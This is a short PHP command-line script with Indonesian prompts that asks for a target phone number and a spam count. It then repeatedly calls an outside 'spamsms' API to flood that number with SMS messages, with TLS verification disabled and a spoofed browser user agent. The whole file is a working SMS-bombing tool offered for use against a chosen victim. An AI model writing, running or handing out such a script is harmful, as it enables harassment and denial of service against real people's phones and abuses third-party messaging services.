<?php


echo "masukan nomor : ";
$target = trim(fgets(STDIN));
echo "masukan jumlah spam : ";
$jm = trim(fgets(STDIN));

for ($i = 0; $i < $jm; $i++){
    echo "waiting api nya agak sedikit lemot...." . PHP_EOL;
    $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL,"https://amfcode.my.id/api/spamsms?phone=$target");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
        $server_output = curl_exec ($ch);
        curl_close ($ch);
        echo $server_output."\n";
}